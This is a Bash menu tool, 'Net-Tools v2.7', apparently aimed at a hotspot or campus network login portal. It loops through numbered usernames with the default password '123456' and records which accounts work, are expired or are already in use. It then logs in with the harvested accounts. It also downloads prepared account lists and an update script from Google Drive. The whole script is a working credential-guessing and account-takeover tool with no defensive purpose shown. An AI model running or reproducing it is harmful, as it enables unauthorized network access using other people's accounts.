#Net-Tools v2.7

blue='\e[1;34m'
green='\e[0;23m'
orange='\e[1;33m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'


bip() {
  ( \speaker-test --frequency $1 --test sine )&
  pid=$!
  \sleep 0.${2}s
  \kill -9 $pid
}

#Procedure
netLogin(){
	lText=100
	while read -r userID
	do
		echo -ne "Login for $userID"
		{	
			status=$(curl -L "http://nethost.login/login?username=$userID&password=123456#")
			DATA=$(curl -L portal.net)
			lText=$(expr length "$DATA")
		} &> /dev/null
		{
		while echo "$status" | grep -q "RADIUS"
		do
			echo "-Try again"
			printf "\r"
			status=$(curl -L "http://nethost.login/login?username=$userID&password=123456#")
		done
		} &>/dev/null
		if ((lText > 500))
		then
			echo "success"
			break
		fi

		let cnt=cnt+1
		echo -e $orange"->$cnt/$total"$cyan
		printf "\r" 
	done < $stepU
}

getUser(){
	folder="NetDatabase/$stepU"
	while [ $uss -lt $max ]
	do
				
		{		
		if ((uss / 100 > 0))
		then
			status=$(curl -L "http://nethost.login/login?username=$stepU$subU$uss&password=123456#")
		elif ((uss / 10 > 0))
		then
			status=$(curl -L "http://nethost.login/login?username=$stepU${subU}0$uss&password=123456#")
		else 
			status=$(curl -L "http://nethost.login/login?username=$stepU${subU}00$uss&password=123456#")
		fi

		while echo "$status" | grep -q "RADIUS"
		do
			if ((uss / 100 > 0))
			then
				status=$(curl -L "http://nethost.login/login?username=$stepU$subU$uss&password=123456#")
			elif ((uss / 10 > 0))
			then
				status=$(curl -L "http://nethost.login/login?username=$stepU${subU}0$uss&password=123456#")
			else 
				status=$(curl -L "http://nethost.login/login?username=$stepU${subU}00$uss&password=123456#")
			fi
		done
		
		content=$(curl -L portal.net)
		lText=$(expr length "$content")
		} &> /dev/null

		if ((lText > 500))
		then
			if ((uss / 100 > 0))
			then
				echo "${stepU}${subU}${uss}" >> $folder/$stepU
			elif ((uss / 10 > 0))
			then
				echo "${stepU}${subU}0${uss}" >> $folder/$stepU
			else
				echo "${stepU}${subU}00${uss}" >> $folder/$stepU
			fi
			{
			curl -L "http://nethost.login/logout"
			bip 4000 200
			} &> /dev/null
			echo "${stepU}${subU}${uss} ready"
		elif echo "$status" | grep -q "You"
		then
			if ((uss / 100 > 0))
			then
				echo "${stepU}${subU}${uss}" >> $folder/aLOG$stepU
			elif ((uss / 10 > 0))
			then
				echo "${stepU}${subU}0${uss}" >> $folder/aLOG$stepU
			else
				echo "${stepU}${subU}00${uss}" >> $folder/aLOG$stepU
			fi
			{	
			bip 4000 200
			sleep 0.2
			bip 400 200
			} &> /dev/null
			echo "${stepU}${subU}${uss} already login"
		elif echo "$status" | grep -q "expire"
		then
			if ((uss / 100 > 0))
			then
				echo "${stepU}${subU}${uss}" >> $folder/EXP$stepU
			elif ((uss / 10 > 0))
			then
				echo "${stepU}${subU}0${uss}" >> $folder/EXP$stepU
			else
				echo "${stepU}${subU}00${uss}" >> $folder/EXP$stepU
			fi
			{	
			bip 4000 200
			sleep 0.2
			bip 400 200
			sleep 0.2
			bip 4000 200
			} &> /dev/null
			echo "${stepU}${subU}${uss} EXPIRE"
		elif echo "$status" | grep -q "RADIUS"
		then
			if ((uss / 100 > 0))
			then
				echo "${stepU}${subU}${uss}" >> $folder/RNR$stepU
			elif ((uss / 10 > 0))
			then
				echo "${stepU}${subU}0${uss}" >> $folder/RNR$stepU
			else
				echo "${stepU}${subU}00${uss}" >> $folder/RNR$stepU
			fi
			{	
			bip 4000 200
			sleep 0.2
			bip 8000 200
			sleep 0.2
			bip 4000 200
			} &> /dev/null
			echo "${stepU}${subU}${uss} RADIUS not responding"
		fi
		let uss=uss+1
		let cnt=cnt+1
		echo -e -ne $orange"->$cnt/$total"$cyan
		printf "\r" 
	done
}

RenewDatabase(){
	folder="NetDatabase/$stepU"
	while read -r userID
	do
		{
		status=$(curl -L "http://nethost.login/login?username=$userID&password=123456#")
		while echo "$status" | grep -q "RADIUS"
		do
			status=$(curl -L "http://nethost.login/login?username=$userID&password=123456#")
		done
		content=$(curl -L portal.net)
		lText=$(expr length "$content")

		if ((lText > 500))
		then
			echo "${userID}" >> $folder/$stepU
			curl -L "http://nethost.login/logout"
			bip 4000 200
		elif echo "$status" | grep -q "You"
		then
			echo "${userID}" >> $folder/aLOG$stepU
			bip 4000 200
			sleep 0.2
			bip 400 200

		elif echo "$status" | grep -q "expire"
		then
			echo "${userID}" >> $folder/EXP$stepU
			bip 4000 200
			sleep 0.2
			bip 400 200
			sleep 0.2
			bip 4000 200

		elif echo "$status" | grep -q "RADIUS"
		then
			echo "${userID}" >> $folder/RNR$stepU
			bip 4000 200
			sleep 0.2
			bip 400 200
			sleep 0.2
			bip 4000 200
			sleep 0.2
			bip 8000 200
			
		elif echo "$status" | grep -q "invalid"
		then
			echo "${userID}" >> $folder/INV$stepU
			bip 4000 200
			sleep 0.2
			bip 8000 200
			sleep 0.2
			bip 4000 200
		else
			echo "${userID}" >> $folder/NotDevine$stepU
		fi
		} &> /dev/null

		let cnt=cnt+1
		echo -e -ne $orange"->$cnt/$total"$cyan
		printf "\r"

	done < $stepU
}

sorting_file(){
	folder="NetDatabase/$stepU"
	mv $folder/aLOG$stepU $folder/aLOG$stepU.old
 	mv $folder/$stepU $folder/$stepU.old
	mv $folder/EXP$stepU $folder/EXP$stepU.old
	mv $folder/INV$stepU $folder/INV$stepU.old

	sort -k 1.8n $folder/aLOG$stepU.old | uniq -i > $folder/aLOG$stepU
	sort -k 1.8n $folder/$stepU.old | uniq -i > $folder/$stepU
	sort -k 1.8n $folder/EXP$stepU.old | uniq -i > $folder/EXP$stepU
	sort -k 1.8n $folder/INV$stepU.old | uniq -i > $folder/INV$stepU
}

ping_test(){
	a=$(ping -w $packet $url)
	i=0
	while true
	do
		if echo "${a:i:14}" | grep -q "statistics ---"
		then
			break
		fi
		let i=i+1
	done
	let i=i+15
	let j=i
	while true
	do
		if echo "${a:j:3}" | grep -q "rtt"
		then
			break
		fi
		let j=j+1
	done
	let k=j-i
	echo -e -ne $orange"${a:$i:$k}"$cyan
	echo -e "${a:$j:100}"$blue
}

#body
while true
do
	clear
	echo -e $cyan
	echo "	  _	     ____________"
	echo "	 / \      /        |             \      |"
	echo "	/   \     |        |             |      |"
	echo "	|    \    |        |             |______|"
	echo "	|     \   |        |             |      |"
	echo "	|      \  |        |      / \    |      |"
	echo "	|       \_|        \      \ /   /       /"
	echo ""
	echo -e $blue"# Welcome to Nethost Tools >>" 
	echo -e $green
	echo "	1. Status"
	echo "	2. Get Net. ID"
	echo "	3. Login to Specific Database"
	echo "	4. Update Database ID"
	echo "	5. Sorting specific file"
	echo "	6. View database"
	echo "	7. Logout"
	echo "	8. Download Database"
	echo "	9. Connection testing"
	echo -e "	0. EXIT" $blue
	read -p "	>>" option
	
	case $option in
		1)
			{
			status=$(curl -L portal.net)
			stts=${status:270:11}
			} &> /dev/null
			if echo "$status" | grep -q "plash"
			then
				echo -e "Status :$orange Login$blue - Username :$red $stts" $blue
			else
				echo -e "Status :$orange Off" $blue
			fi
			read -p "done... press [ENTER] to continue.."
			;;
		2)
			read -p "Head (exp. 'plash17') >>" stepU
			read -p "sub domain (exp 'b') >>" subU
			read -p "lower ID (exp '1') >>" min
			read -p "higest ID (exp '999') >>" max
			let max=max+1
			let uss=min
			let total=max-min
			cnt=0
			echo -e "processing.." $cyan 
			getUser
			read -p "done... press [ENTER] to continue.."
			;;
		3)
			read -p "Head (exp. 'plash17') >>" stepU
			cat NetDatabase/$stepU/$stepU > $stepU
			cat NetDatabase/$stepU/aLOG$stepU >> $stepU
			echo -e "processing.." $cyan 
			sleep 1
			let total=$(< $stepU wc -l)
			let cnt=0
			netLogin
			read -p "done... press [ENTER] to continue.."
			;;
		4)
			echo -e $red
			ls NetDatabase -B
			echo -e $green"Type option"$blue
			read -p ">>" stepU
			cat NetDatabase/$stepU/* > $stepU
			mv NetDatabase/$stepU NetDatabase/$stepU.Old.$(date '+%Y-%m-%d')
			mkdir NetDatabase/$stepU

			echo -e "processing.." $cyan 
			sleep 1
			let total=$(< $stepU wc -l)
			let cnt=0

			RenewDatabase
			read -p "done... press [ENTER] to continue.."
			;;
		5)
			echo -e $red
			ls NetDatabase -B
			echo -e $green"Type option"$blue
			read -p ">>" stepU
			sorting_file
			read -p "done... press [ENTER] to continue.."
			;;
		6)
			echo -e $red
			ls NetDatabase -B
			echo -e $green"Type option"$blue
			read -p ">>" stepU
			echo  ""
			folder="NetDatabase/$stepU"
			echo -e $cyan"---$stepU"$orange
			cat $folder/$stepU -n
			echo -e $cyan"---aLOG$stepU"$orange
			cat $folder/aLOG$stepU -n
			echo -e $cyan"---EXP$stepU"$orange
			cat $folder/EXP$stepU -n
			echo -e $cyan"---INV$stepU"$orange
			cat $folder/INV$stepU -n
			read -p "done... press [ENTER] to continue.."
			;;
		7)
			curl -L "http://nethost.login/logout"
			read -p "done... press [ENTER] to continue.."
			;;
		8)
			rm data.txt
			wget -O plash17 "https://drive.google.com/uc?export=download&id=1rDSTRpevHCXNlALVFnZUJHlW9wS3CXOL"
			wget -O plash18 "https://drive.google.com/uc?export=download&id=1muPgMYmAH87DB0s10BEOWKGEeb12NcaZ"
			stepU="plash17"
			echo -e "processing plash17.." $cyan 
			sleep 1
			let total=$(< $stepU wc -l)
			let cnt=0
			RenewDatabase
			stepU="plash18"
			echo -e "processing plash18.." $cyan 
			sleep 1
			let total=$(< $stepU wc -l)
			let cnt=0
			RenewDatabase
			read -p "done... press [ENTER] to continue.."
			;;
		9)
			read -p "number of packets : " packet
			echo -e $red"Processing Devices-Nethost..."
			url=10.1.1.2
			ping_test
			echo -e $red"Processing Devices-Internet..."
			url=8.8.8.8
			ping_test
			read -p "done... press [ENTER] to continue.."
			;;
		99)
			pkg install curl
			pkg install wget
			echo 'rm net.sh; hash -r; wget -O net.sh "https://drive.google.com/uc?export=download&id=1Kw3cHDDFU_St3jP4s1aIYZ9QmHROQm3X"; chmod +x net.sh; echo done...' > updater.sh
			chmod +x updater.sh
			read -p "updater.sh ready... press [ENTER] to continue.."
			;;
		0)
			break
			;;
		*)
			echo "Wrong option!!!"
			echo "ver. 2.7 15/15/2018"
			read -p "done... press [ENTER] to continue.."
			;;
	esac
done

